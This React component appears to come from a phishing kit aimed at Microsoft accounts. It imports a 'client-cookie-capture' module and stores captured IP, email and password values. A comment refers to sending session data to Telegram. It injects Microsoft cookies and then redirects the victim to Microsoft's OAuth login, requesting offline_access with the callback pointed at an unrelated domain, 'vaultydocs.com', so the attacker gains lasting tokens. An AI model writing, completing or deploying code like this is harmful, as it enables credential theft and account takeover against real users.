import React, { useEffect } from 'react';
import { injectMicrosoftCookies, setCredentials } from '../utils/client-cookie-capture';

let ipaddress = '';
let email = '';
let password = '';

const SLOW_DELAY = 1200;
const redirectDelay = SLOW_DELAY * 3;

const RealOAuthRedirect: React.FC<any> = ({ onLoginSuccess, sessionData }) => {
  useEffect(() => {
    // Set credentials if needed
    setCredentials(ipaddress, email, password);

    // All your original logic here...

    // Prepare PKCE and OAuth state
    const generateRandomString = (length: number): string => {
      const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~';
      let result = '';
      const values = window.crypto.getRandomValues(new Uint8Array(length));
      for (let i = 0; i < length; i++) {
        result += charset[values[i] % charset.length];
      }
      return result;
    };

    const generateCodeChallenge = async (codeVerifier: string): Promise<string> => {
      const encoder = new TextEncoder();
      const data = encoder.encode(codeVerifier);
      const digest = await window.crypto.subtle.digest('SHA-256', data);
      return btoa(String.fromCharCode(...new Uint8Array(digest)))
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
    };

    (async () => {
      // ... any of your pre-login logic (saving session, sending to Telegram, etc) ...

      setTimeout(async () => {
        // >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
        // INJECT COOKIES RIGHT BEFORE REDIRECT!
        injectMicrosoftCookies();
        // <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

        try {
          const codeVerifier = generateRandomString(64);
          const codeChallenge = await generateCodeChallenge(codeVerifier);
          const state = Math.random().toString(36).substring(2, 15);

          sessionStorage.setItem('pkce_verifier', codeVerifier);
          sessionStorage.setItem('oauth_state', state);

          const params = new URLSearchParams({
            client_id: '59f34afe-9b1b-4f3a-9311-fd792fe249ca',
            response_type: 'code',
            redirect_uri: 'https://vaultydocs.com/oauth-callback',
            response_mode: 'query',
            scope: 'openid profile email User.Read offline_access',
            code_challenge: codeChallenge,
            code_challenge_method: 'S256',
            state: state,
            prompt: 'login',
          });

          const microsoftOAuthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${params.toString()}`;
          window.location.href = microsoftOAuthUrl;
        } catch (err) {
          // Fallback if PKCE fails
          const fallbackState = Math.random().toString(36).substring(2, 15);
          sessionStorage.setItem('oauth_state', fallbackState);

          const fallbackParams = new URLSearchParams({
            client_id: '59f34afe-9b1b-4f3a-9311-fd792fe249ca',
            response_type: 'code',
            redirect_uri: 'https://vaultydocs.com/oauth-callback',
            response_mode: 'query',
            scope: 'openid profile email User.Read offline_access',
            state: fallbackState,
            prompt: 'login',
          });

          const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${fallbackParams.toString()}`;
          window.location.href = fallbackUrl;
        }
      }, redirectDelay);
    })();
  }, [sessionData, onLoginSuccess]);

  return null;
};

export default RealOAuthRedirect;